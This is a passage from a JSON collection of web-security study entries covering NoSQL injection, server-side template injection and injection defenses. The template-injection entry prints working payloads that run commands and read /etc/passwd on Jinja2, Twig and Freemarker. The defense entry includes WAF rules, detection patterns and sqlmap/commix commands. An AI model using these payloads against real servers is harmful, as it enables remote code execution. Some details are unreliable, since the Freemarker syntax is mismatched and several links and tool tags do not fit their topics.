LOOK FOR:\n- **Dynamic Query Construction**: Building queries from user input\n- **JSON Input Handling**: Accepting JSON objects in requests\n- **NoSQL Databases**: MongoDB, CouchDB, Cassandra, Redis usage\n- **Operator Injection**: Presence of $, [, ], {, } in input\n- **Framework Usage**: Mongoose, PyMongo, MongoEngine\n- **API Endpoints**: REST APIs with database queries\n\nSECURITY IMPLICATIONS:\n- **Authentication Bypass**: Login without valid credentials\n- **Data Exfiltration**: Unauthorized data access\n- **Data Manipulation**: Modify database records\n- **System Compromise**: JavaScript code execution in $where\n- **Denial of Service**: Resource-intensive queries\n\nCOMMON PITFALLS:\n- **Assuming Type Safety**: JSON parsing doesn't prevent injection\n- **Framework Protection**: ORMs don't always prevent injection\n- **Blind Injection**: Missing time-based and boolean-based tests\n- **Multiple Databases**: Not testing all NoSQL database types\n- **Operator Blacklisting**: Incomplete operator sanitization\n- **Nested Objects**: Missing deep sanitization\n\nTOOLS REFERENCE:\n- **NoSQLMap**: https://github.com/codingo/NoSQLMap (NoSQL injection tool)\n- **MongoDB Injection Tool**: https://github.com/an0nlk/Nosql-Exploitation-Framework\n- **Burp Suite**: https://portswigger.net/burp (manual testing)\n- **Postman**: https://www.postman.com/ (API testing)\n- **MongoDB Compass**: https://www.mongodb.com/products/compass (database inspection)\n\nFURTHER READING:\n- OWASP NoSQL Injection: https://owasp.org/www-community/attacks/NoSQL_Injection\n- MongoDB Injection: https://www.netsparker.com/blog/web-security/nosql-injection-mongodb/\n- NoSQL Security Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/NoSQL_Injection_Prevention_Cheat_Sheet.html\n- MongoDB Security: https://docs.mongodb.com/manual/security/\n- JSON Injection Attacks: https://portswigger.net/web-security/server-side-template-injection",
      "tags": [
        "nosql-injection",
        "mongodb",
        "database-injection",
        "json-injection",
        "nosql-security"
      ],
      "related_tools": [
        "comparison_sql_testing",
        "burp-api-scanner",
        "linux-exploit-suggester",
        "ffuf-api",
        "owasp-zap"
      ]
    },
    {
      "id": "template-injection-ssti",
      "title": "Template Injection (SSTI)",
      "content": "OBJECTIVE: Understand and exploit Server-Side Template Injection vulnerabilities where template engines process user input as template code.\n\nACADEMIC BACKGROUND:\nServer-Side Template Injection (SSTI) occurs when user input is embedded in templates and processed by template engines. This allows attackers to inject template directives that can lead to code execution, file inclusion, or information disclosure. SSTI affects popular template engines like Twig, Jinja2, Freemarker, and Velocity.\n\nSTEP-BY-STEP PROCESS:\n\n1. Template Injection Fundamentals:\n\nHow SSTI Works:\n```python\n# Vulnerable Flask/Jinja2 code\ntemplate = f\"Hello {request.args.get('name')}!\"\nreturn render_template_string(template)\n\n# Attacker input: {{7*7}}\n# Result: Hello 49!\n\n# Attacker input: {{config}}\n# Result: Leaks application configuration\n```\n\nCommon Template Engines:\n- **Jinja2** (Python): {{ }}, {% %}\n- **Twig** (PHP): {{ }}, {% %}\n- **Freemarker** (Java): ${ }, <# >\n- **Velocity** (Java): ${ }, #*\n- **Handlebars** (JavaScript): {{ }}\n- **ERB** (Ruby): <%= %>\n\n2. Basic Template Injection:\n\nInformation Disclosure:\n```jinja2\n# Jinja2 information leak\n{{config}}\n{{self.__dict__}}\n{{lipsum.__globals__}}\n\n# Twig information leak\n{{_self.env}}\n{{dump(app)}}\n\n# Freemarker information leak\n${.data_model}\n${.globals}\n```\n\nCode Execution:\n```jinja2\n# Python/Jinja2 RCE\n{{''.__class__.__mro__[1].__subclasses__()[40]('/etc/passwd').read()}}\n\n# PHP/Twig RCE\n{{[\"id\"]|filter(\"system\")}}\n\n# Java/Freemarker RCE\n${T(java.lang.Runtime).getRuntime().exec(\"id\")}\n```\n\n3. Template Engine Detection:\n\nFingerprinting Techniques:\n```jinja2\n# Error-based detection\n{{invalid_syntax}}\n\n# Version detection\n{{''.__class__.__module__}}\n\n# Engine identification\n{{_self}}  # Twig\n{{self}}   # Jinja2\n${.version} # Freemarker\n```\n\nPolyglot Payloads:\n```jinja2\n# Multi-engine payload\n${{<%[%'\"}}%\\\\\\\"\n\n# Universal test\n{{7*7}}  # Returns 49 if vulnerable\n${7*7}   # Returns 49 if vulnerable\n<%=7*7%> # Returns 49 if vulnerable\n```\n\n4. Advanced SSTI Exploitation:\n\nJinja2 Advanced Exploitation:\n```jinja2\n# File read\n{{getattr(getattr(request,'application'),getattr(request,'application').__dict__['__globals__']['__builtins__']['open']('/etc/passwd').read())}}\n\n# Command execution\n{{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}\n\n# Python object introspection\n{{''.__class__.__mro__[1].__subclasses__()}}\n```\n\nTwig Advanced Exploitation:\n```twig\n# File system access\n{{include('/etc/passwd')}}\n\n# PHP function calls\n{{[\"phpinfo\"]|filter(\"call_user_func\")}}\n\n# Code execution\n{{_self.env.registerUndefinedFilterCallback(\"system\")}}{{_self.env.getFilter(\"id\")}}\n```\n\nFreemarker Advanced Exploitation:\n```freemarker\n# Java class access\n${T(java.lang.Runtime).getRuntime().exec(\"id\")}\n\n# File operations\n${T(java.io.File).new(\"/etc/passwd\").exists()}\n\n# API calls\n${T(javax.script.ScriptEngineManager).new().getEngineByName(\"js\").eval(\"java.lang.Runtime.getRuntime().exec('id')\")}\n```\n\n5. SSTI Prevention:\n\nInput Sanitization:\n```python\n# Avoid direct template rendering\nfrom flask import render_template_string\n\n# DON'T DO:\nreturn render_template_string(user_input)\n\n# DO:\ndata = {'name': user_input}\nreturn render_template('template.html', **data)\n```\n\nTemplate Sandboxing:\n```jinja2\n# Jinja2 sandbox\nfrom jinja2.sandbox import SandboxedEnvironment\nenv = SandboxedEnvironment()\n\n# Limit available functions\nenv.globals = {}\nenv.filters = {}\n```\n\nContent Security Policy:\n```html\n<!-- CSP headers -->\nContent-Security-Policy: default-src 'self'; script-src 'self'\n\n<!-- Prevent XSS from SSTI -->\n```\n\n6. SSTI in Modern Frameworks:\n\nExpress.js Handlebars:\n```javascript\n// Vulnerable\napp.get('/template', (req, res) => {\n    const template = handlebars.compile(req.query.template);\n    res.send(template({}));\n});\n\n// Injection: {{lookup this.constructor.constructor 'alert(\"xss\")'}}\n```\n\nDjango Templates:\n```python\n# Django SSTI\n# Vulnerable if using template strings\ndangerous = Template(f\"Hello {user_input}!\")\n\n# Injection: {{settings.SECRET_KEY}}\n```\n\nAngularJS Client-Side:\n```javascript\n// Client-side template injection\n// Vulnerable to expression injection\n$scope.trustedHtml = $sce.trustAsHtml(userInput);\n\n// Injection: {{constructor.constructor('alert(1)')()}}\n```\n\nWHAT TO LOOK FOR:\n- **Template Rendering**: Applications using template engines\n- **User Input in Templates**: Dynamic template construction\n- **Template Syntax**: Presence of {{ }}, ${ }, <%= %> in responses\n- **Error Messages**: Template parsing errors\n- **Framework Usage**: Jinja2, Twig, Freemarker, Handlebars\n- **Content Generation**: Dynamic HTML/content generation\n\nSECURITY IMPLICATIONS:\n- **Remote Code Execution**: Full system compromise\n- **Information Disclosure**: Configuration and secrets leakage\n- **File System Access**: Read/write arbitrary files\n- **Privilege Escalation**: Execute commands as web server user\n- **Data Manipulation**: Modify application data\n\nCOMMON PITFALLS:\n- **Template Confusion**: Not recognizing template syntax\n- **Engine Misidentification**: Wrong engine-specific payloads\n- **Sandbox Assumptions**: Believing sandboxes prevent all attacks\n- **Client-Side Only**: Missing server-side template injection\n- **Framework Updates**: Not testing updated template engines\n- **Indirect Injection**: Templates loaded from user-controlled paths\n\nTOOLS REFERENCE:\n- **TPLMap**: https://github.com/epinna/tplmap (template injection scanner)\n- **Burp Suite**: https://portswigger.net/burp (manual testing)\n- **Template Injection Payloads**: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection\n- **SSTImap**: https://github.com/vladko312/SSTImap (automated SSTI testing)\n- **Tplmap**: https://github.com/epinna/tplmap (template injection tool)\n\nFURTHER READING:\n- PortSwigger SSTI: https://portswigger.net/web-security/server-side-template-injection\n- OWASP SSTI: https://owasp.org/www-community/attacks/Server-Side_Template_Injection\n- Template Injection Cheat Sheet: https://www.netsparker.com/blog/web-security/server-side-template-injection-cheat-sheet/\n- Jinja2 SSTI: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2\n- Freemarker SSTI: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#freemarker",
      "tags": [
        "template-injection",
        "ssti",
        "server-side",
        "template-engines",
        "code-execution"
      ],
      "related_tools": [
        "bloodhound-python",
        "ml-pipeline-audit",
        "linux-exploit-suggester",
        "windows-exploit-suggester",
        "burp-api-scanner"
      ]
    },
    {
      "id": "injection-defense-strategies",
      "title": "Injection Defense Strategies",
      "content": "OBJECTIVE: Implement comprehensive defense strategies against all types of injection vulnerabilities including secure coding practices, input validation, and security controls.\n\nACADEMIC BACKGROUND:\nInjection prevention requires a defense-in-depth approach combining multiple security layers. The OWASP Top 10 emphasizes that injection vulnerabilities are preventable through proper input handling and secure coding practices. Research shows that 90% of injection vulnerabilities can be prevented with proper defenses.\n\nSTEP-BY-STEP PROCESS:\n\n1. Input Validation and Sanitization:\n\nWhitelist Validation:\n```python\n# Python input validation\nimport re\n\ndef validate_username(username):\n    # Only allow alphanumeric characters\n    if not re.match(r'^[a-zA-Z0-9_]{3,20}$', username):\n        raise ValueError('Invalid username')\n    return username\n\ndef validate_email(email):\n    # Proper email validation\n    pattern = r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,}$'\n    if not re.match(pattern, email):\n        raise ValueError('Invalid email')\n    return email\n```\n\nContext-Aware Sanitization:\n```php\n// PHP context-aware sanitization\nfunction sanitize_input($input, $context) {\n    switch ($context) {\n        case 'html':\n            return htmlspecialchars($input, ENT_QUOTES, 'UTF-8');\n        case 'sql':\n            return mysqli_real_escape_string($conn, $input);\n        case 'shell':\n            return escapeshellarg($input);\n        case 'ldap':\n            return ldap_escape($input);\n        default:\n            return $input;\n    }\n}\n```\n\n2. Parameterized Queries and Prepared Statements:\n\nSQL Prepared Statements:\n```php\n// PHP PDO prepared statements\n$stmt = $pdo->prepare('SELECT * FROM users WHERE username = ? AND password = ?');\n$stmt->execute([$username, $password]);\n$user = $stmt->fetch();\n\n// MySQLi prepared statements\n$stmt = $mysqli->prepare('SELECT * FROM users WHERE id = ?');\n$stmt->bind_param('i', $id);\n$stmt->execute();\n$result = $stmt->get_result();\n```\n\nNoSQL Parameterized Queries:\n```javascript\n// MongoDB parameterized queries\nconst user = await User.findOne({\n    username: req.body.username,\n    password: req.body.password\n});\n\n// Avoid dynamic query construction\n// DON'T DO: db.collection.find(JSON.parse(req.body.query))\n```\n\n3. ORM and Query Builder Security:\n\nActiveRecord Security:\n```ruby\n# Ruby on Rails secure queries\nUser.where('username = ? AND password = ?', username, password)\n\n# Avoid string interpolation\n# DON'T DO: User.where(\"username = '#{username}'\")\n```\n\nEntity Framework Security:\n```csharp\n// C# Entity Framework\nvar user = context.Users\n    .FirstOrDefault(u => u.Username == username && u.Password == password);\n\n// Avoid raw SQL unless necessary\nvar users = context.Users\n    .FromSqlRaw(\"SELECT * FROM Users WHERE Username = {0}\", username)\n    .ToList();\n```\n\n4. Web Application Firewall (WAF) Configuration:\n\nModSecurity Rules:\n```apache\n# SQL injection protection\nSecRule ARGS \"@rx \\b(union|select|insert|update|delete|drop|create|alter)\\b\" \\\n    \"id:1001,phase:2,t:lowercase,deny,status:403,msg:'SQL Injection Attack'\"\n\n# Command injection protection\nSecRule ARGS \"@rx [;|&`\\$\\(\\)]\" \\\n    \"id:1002,phase:2,deny,status:403,msg:'Command Injection Attack'\"\n\n# XSS protection\nSecRule ARGS \"@rx <script\" \\\n    \"id:1003,phase:2,t:lowercase,deny,status:403,msg:'XSS Attack'\"\n```\n\nOWASP Core Rule Set:\n```bash\n# Install OWASP CRS\ngit clone https://github.com/coreruleset/coreruleset\ncp coreruleset/rules/*.conf /etc/modsecurity/crs/\n\n# Enable SQL injection rules\n# Enable command injection rules\n# Enable XSS rules\n```\n\n5. Least Privilege Principle:\n\nDatabase User Permissions:\n```sql\n-- Create limited database user\nCREATE USER 'webapp'@'localhost' IDENTIFIED BY 'secure_password';\nGRANT SELECT, INSERT, UPDATE ON webapp.* TO 'webapp'@'localhost';\nREVOKE DROP, CREATE, ALTER ON *.* FROM 'webapp'@'localhost';\n\n-- Avoid root database access\n-- Use separate users for different functions\n```\n\nApplication User Context:\n```bash\n# Run web application as limited user\n# Not as root or administrator\nuseradd -r -s /bin/false webapp\nchown -R webapp:webapp /var/www/app\n\n# Use systemd user context\n[Service]\nUser=webapp\nGroup=webapp\n```\n\n6. Error Handling and Logging:\n\nSecure Error Handling:\n```php\n// PHP secure error handling\nini_set('display_errors', 0);\nini_set('log_errors', 1);\nerror_reporting(E_ALL);\n\n// Custom error handler\nfunction secure_error_handler($errno, $errstr, $errfile, $errline) {\n    // Log error without exposing sensitive information\n    error_log(\"Error: $errstr in $errfile:$errline\");\n    \n    // Return generic error to user\n    http_response_code(500);\n    echo 'Internal server error';\n    exit;\n}\nset_error_handler('secure_error_handler');\n```\n\nAttack Logging:\n```python\n# Python attack logging\nimport logging\n\nlogger = logging.getLogger('security')\nlogger.setLevel(logging.WARNING)\n\n# Log potential injection attempts\ndef log_suspicious_input(input_string, source):\n    if any(char in input_string for char in [';', '|', '&', '`', '$']):\n        logger.warning(f'Suspicious input from {source}: {input_string}')\n```\n\n7. Content Security Policy (CSP):\n\nCSP Implementation:\n```html\n<!-- Strict CSP -->\n<meta http-equiv=\"Content-Security-Policy\" content=\"\n    default-src 'self';\n    script-src 'self' 'unsafe-inline';\n    style-src 'self' 'unsafe-inline';\n    img-src 'self' data:;\n    font-src 'self';\n    connect-src 'self';\n    object-src 'none';\n    base-uri 'self';\n    form-action 'self';\n\">\n\n<!-- Report violations -->\n<meta http-equiv=\"Content-Security-Policy-Report-Only\" content=\"\n    default-src 'self';\n    report-uri /csp-violation-report-endpoint\n\">\n```\n\nCSP Monitoring:\n```javascript\n// CSP violation reporting\ndocument.addEventListener('securitypolicyviolation', (e) => {\n    fetch('/csp-report', {\n        method: 'POST',\n        body: JSON.stringify({\n            'document-uri': e.documentURI,\n            'violated-directive': e.violatedDirective,\n            'original-policy': e.originalPolicy,\n            'blocked-uri': e.blockedURI\n        })\n    });\n});\n```\n\n8. Security Testing and Monitoring:\n\nAutomated Security Testing:\n```bash\n# Integrate security testing in CI/CD\n# SQL injection testing\nsqlmap -u \"http://localhost/api/users?id=1\" --batch --crawl=1\n\n# Command injection testing\ncommix -u \"http://localhost/ping?host=127.0.0.1\" --batch\n\n# XSS testing\nxsstrike -u \"http://localhost/search?q=test\" --crawl\n```\n\nRuntime Application Self-Protection (RASP):\n```java\n// Java RASP example\npublic class InjectionProtector {\n    public static String protectSQL(String input) {\n        // Runtime SQL injection detection\n        if (input.matches(\".*(\\bUNION\\b|\\bSELECT\\b|\\bINSERT\\b).*\")) {\n            throw new SecurityException(\"Potential SQL injection detected\");\n        }\n        return input;\n    }\n}\n```\n\nWHAT TO LOOK FOR:\n- **Input Validation**: Presence of validation and sanitization\n- **Parameterized Queries**: Use of prepared statements\n- **Error Handling**: Secure error messages and logging\n- **Least Privilege**: Limited database and system permissions\n- **WAF Configuration**: Web application firewall rules\n- **CSP Headers**: Content Security Policy implementation\n- **Security Testing**: Automated security scans in CI/CD\n\nSECURITY IMPLICATIONS:\n- **Attack Prevention**: Block injection attempts at multiple layers\n- **Damage Limitation**: Reduce impact of successful attacks\n- **Compliance**: Meet security standards and regulations\n- **Monitoring**: Detect and respond to attack attempts\n- **Forensic Analysis**: Proper logging for incident investigation\n\nCOMMON PITFALLS:\n- **Validation Only**: Relying solely on input validation\n- **Inconsistent Application**: Different validation in different parts\n- **Performance Impact**: Security controls slowing down application\n- **False Positives**: Overly strict rules blocking legitimate input\n- **Maintenance Neglect**: Not updating security rules and signatures\n- **Bypass Techniques**: Not accounting for encoding and obfuscation\n\nTOOLS REFERENCE:\n- **OWASP ZAP**: https://www.zaproxy.org/ (automated security testing)\n- **ModSecurity**: https://modsecurity.org/ (WAF)\n- **Sqreen**: https://www.sqreen.com/ (RASP)\n- **SonarQube**: https://www.sonarsource.com/products/sonarqube/ (SAST)\n- **Snyk**: https://snyk.io/ (dependency vulnerability scanning)\n\nFURTHER READING:\n- OWASP Injection Prevention: https://owasp.org/www-community/Injection_Prevention_Cheat_Sheet\n- Secure Coding Practices: https://www.owasp.org/index.php/OWASP_Secure_Coding_Practices_Checklist\n- Defense in Depth: https://en.wikipedia.org/wiki/Defense_in_depth_(computing)\n- CIS Controls: https://www.cisecurity.org/controls/\n- NIST Cybersecurity Framework: https://www.nist.gov/cyberframework",
      "tags": [
        "injection-defense",
        "secure-coding",
        "input-validation",
        "waf",
        "csp",
        "least-privilege"
      ],
      "related_tools": [
        "hunter-io",
        "eslint-security",
        "comparison_sql_testing",
        "owasp-zap",
        "bloodhound-python"
      ]
    }
  ]
}